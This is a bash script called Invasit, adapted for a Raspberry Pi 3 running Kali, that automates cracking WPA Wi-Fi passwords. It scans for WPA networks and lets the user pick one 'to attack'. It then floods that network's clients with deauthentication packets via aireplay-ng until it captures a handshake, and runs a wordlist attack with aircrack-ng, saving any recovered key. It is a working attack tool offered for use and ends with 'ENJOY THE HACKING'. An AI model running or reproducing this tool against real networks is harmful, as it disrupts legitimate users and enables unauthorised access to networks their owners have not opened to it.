#!/bin/bash

# Invasit version 1.2 || by: valvesss

# Fork to run it with Raspberry PI 3 command-line mode 
# RPI3 with Kali Linux Full Nexmon 2017.2
# by Roger
# screen interfaces and XTerm removed - command-line access only

################## SHORTCUTS/STUFFS ##########################

# Deauth time for aireplay-ng
deauthtime=999

# Create auxiliar folders for handshake/password
mkdir -p handshakes
mkdir -p passwords

# configure wlan on rpi (currently only accepts physical nic)
function setupairmonrpi {	
	nexutil -m2
	airmon-ng start $nic
}

# Simple usage of airodump just to see all hosts
function airodumpall {	
	echo "FIND YOUR TARGET..." 
	trap - INT
	airodump-ng -a --encrypt WPA $nic -w target -o kismet
	trap ctrl_c INT
}

# This function capture the specific network data
function airodumpscanclients {
	echo "SCANNING $networkname NETWORK..." 
	trap - INT
	airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic 
	trap ctrl_c INT
}

# This is the function the deauthenticate the clients of the network
function deauthesp {
	echo "DEAUTHENTICATING CLIENTS..." 
	aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic &
}

# Capture clients MAC
function getclients {
nr=0
	while [ $nr = 0 ]; do
	cat $name-01.csv | awk 'NR==6,NR==12' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
	nr=$(cat $mac | wc -l)
	done
}

# Kill aircrack-ng family & xterm processes
function killeverybody {
	killall aireplay-ng &>/dev/null
	killall airodump-ng &>/dev/null
	#killall xterm &>/dev/null			
}

# Time for most functions
st='0.1'

# Colors for echo
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[1;37m'
NC='\033[0m'

# user @ machine # shortchut
userpath="`whoami`@`hostname`:`pwd`#"

# Precautions
trap ctrl_c INT
function ctrl_c () {
	echo -e "${NC}"
	END
}


################# WINDOWS + RESOLUTIONS #####################
## From Fluxion

# Windows + Resolution
function setresolution {
	echo 'disabled'
}

######################### START ##############################

# INTRODUCTION
function INTRO {
clear
echo ""
echo -e "	${GREEN}I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
sleep $st
echo -e "	I  N N      N   V           V  A A        S         I      T"
sleep $st
echo -e "	I  N  N     N    V         V  A   A       S         I      T"
sleep $st
echo -e "	I  N   N    N     V       V  A     A      SSSSSSSS  I      T"
sleep $st
echo -e "	${YELLOW}I  N    N   N      V     V  AAAAAAAAA            S  I      T"
sleep $st
echo -e "	I  N     N  N       V   V  A         A           S  I      T"
sleep $st
echo -e "	I  N      N N        V V  A           A          S  I      T"
sleep $st
echo -e "	I  N       NN         V  A             A  SSSSSSSS  I      T${NC}"
sleep $st
echo -e "								${RED}v1.2${NC}"
}

#######################
# 1) Create NIC mon0. #

function MONMODE {

# The name of the virtual nic the will be created

	#nic=mon0

# User select the real nic to be used

	read -e -p $'\x0a# Select the network card you want to use [enter for wlan0]: ' nicreal

	if [ -z "$nicreal" ] || [ "$nicreal" = "wlan0" ]; then
		nicreal=wlan0

		# Kill all process the could couse trouble to aircrack family
	
		airmon-ng check kill &> /dev/null &
	else
		while ! iwconfig 2>/dev/null | grep -w -q $nicreal ; do
			read -e -p $'\x0a# Sorry, this network card don\'t exist, try again: ' nicreal
		done
	fi

	nic=$nicreal

	
# Check if exist the mon0 nic, else, create and activate
}

##################################################
# 2) Generate table with all WPA networks found. #

function GERTAB {
	
	echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
	airodumpall
	name=target	
}

#######################################################################
# 3) Edit airodump output in a human readable way and choose network. #

function EDTCHN {

	if [ ! -f $name-01.kismet.csv ]; then
		echo -e "\n# File not found, rescaning... #"
		rm -rf $name*.kismet.csv
		airodumpall
	fi

### Output edit ###

# Generate base file

cat target-01.kismet.csv | cut -d ';' -f4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g' | column -t > auxfile0

# Generate names

cat target-01.kismet.csv | cut -d ';' -f3 > auxfile1

# Paste and sort

paste -d " " auxfile0 /dev/null auxfile1 | sort -k3 -n -r > auxfile2

# Generate body

tail -n +2 auxfile2 | nl | sed -e 's/^[ \t]*//' > auxfile3

# Generate banner

head -n 1 auxfile2 | sed -e 's/^/Network /' > auxfile4

# Merge body + banner and finish storing in a file

cat auxfile4 auxfile3 > auxfile5

### End ###

# Choose network

	echo -e "\n--------------------------------------------------------------"
	cat auxfile5
	echo -e "^-------------------------------------------------------------\n"
	read -e -p "# 2) Select the network you want to attack [1,2,3...N]: " num
	let num=num+1

# Based on users option, get the host: mac, channel and name

	bssidtarget=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $2}')
	channel=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $3}')
	networkname=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $5 $6 $7 $8}')
	rm -rf auxfile*
	rm -rf $name-01.kismet.csv
	name=$networkname"_"$bssidtarget

# If it found a useful handshake, advance some steps

	if [ -f ./handshakes/$name-handshake.cap ]; then
		echo -e "\n# Handshake for this network found at: #"
		realpath $name-hanshake.cap
		read -e -p $'\x0a# Use it? [y/n]: ' opt
			if [ $opt = "y" ] || [ $opt = "Y" ]; then
				WORDLIST
			fi	
	fi

	ESPSCN
}

#############################################
# 4) Scan especific network to get clients. #

function ESPSCN {

# Start airodump at the target 

	airodumpscanclients
	mac=$name.lst

# Wait untils csv to be generated

	while [ ! -f $name-01.csv ]; do
		:
	done

	getclients

	ATTAIR
}

########################################
# 5) Attack network using aireplay-ng. #

function ATTAIR {

	echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"

# Attack clients host until find handshake packet

	aux=1
	while `aircrack-ng $name-01.cap 2>/dev/null | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
		while [ $aux -le $nr ]; do
			bssidclient=$(awk -v var=$aux 'NR==var' $mac)
			deauthesp
			let aux=aux+1
		done

		getclients
	done

# Clean handshake packet and erase the previous version of .cap

	wpaclean ./handshakes/$name-handshake.cap $name-01.cap &> /dev/null
	rm -rf $name-01.cap

# Finish useless process (xterm, aicrack family)

	killeverybody

# Delete MAC clients table if all right

	rm -rf $mac
	WORDLIST

}

#################################################
# 6) Search wordlist and verify if don't exist. #

function WORDLIST {

	read -e -p $'\x0a# 4) Type the wordlist full path: #\x0a'"$userpath " path 

# Verify if the wordlist exist 

	a=0
	while [ $a -eq 0 ]; do
		if [ ! -f $path ]; then
			read -e -p $'\x0a# Wordlist not found, try again: #\x0a'"$userpath " path
		else
			a=1
		fi
	done

	AIRCRACK
}

##################################
# 7) Decryptograph the password. #

function AIRCRACK {

# Start the wordlist method attack

	aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt

# Get the password name if works

	if `cat $name-passwd.txt | grep -q "KEY FOUND"` ; then
		cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
		mv $name-password.txt passwords/
		rm -rf $name-passwd.txt
	else
		rm -rf $name-passwd.txt
	fi

# Notice if sucess or not

	if [ -s ./passwords/$name-password.txt ]; then
		echo -e "\n# Sucess !! The password is: ${BLUE} `cat ./passwords/$name-password.txt` ${NC} !!! #\n"
	else
		clear
		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n]: ' opt
		if [ "$opt" = "y" ] || [ "$opt" = "Y" ]; then
			WORDLIST
		else
			END
		fi			
	fi	

# To prevent that aircrack-ng finish the script by itself

	read -p $'To finish, press ENTER... \x0a'
	END

}

################################################################
# 8) Reinicialize network services and delete the nic created. #

function END {

	# Delete the mon0 virtual interface

	echo -e "\n[+] Deleting network card if created..."

	if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
		iw dev $nic del &>/dev/null
	fi

	sleep $st

	# Delete the files used in the process (now useless)

	echo "[+] Deleting jerk files if exist..."
	rm -rf $name-01.csv &>/dev/null
	rm -rf $name-01.cap &>/dev/null
	rm -rf $name.lst &>/dev/null
	rm -rf target-0* &>/dev/null
	rm -rf auxfile* &>/dev/null
	rm -rf $name-passwd.txt &>/dev/null
	sleep $st

	# Restart the network services by two ways

	echo "[+] Restarting network services..."

	if [ "$nicreal" = "wlan0" ]; then 
		service NetworkManager restart
		service networking restart
	fi

	sleep $st

	# Thanks!

	echo "[+] Thanks for using!"
	sleep $st

# Last logo message

echo -e "\n############################################################"
echo -e "##	${GREEN}ENJOY THE HACKING, ${YELLOW}I N V A S I T ${GREEN}EVERYWHERE${NC}	  ##"
echo "############################################################"

# Finish the script

	exit

}
setresolution   # disabled
INTRO 			# valvesss's banner 
MONMODE			# define wireless interface  
setupairmonrpi	# setup rpi internal wireless  
GERTAB			# list all WPA networks
EDTCHN			# choose network

# fin
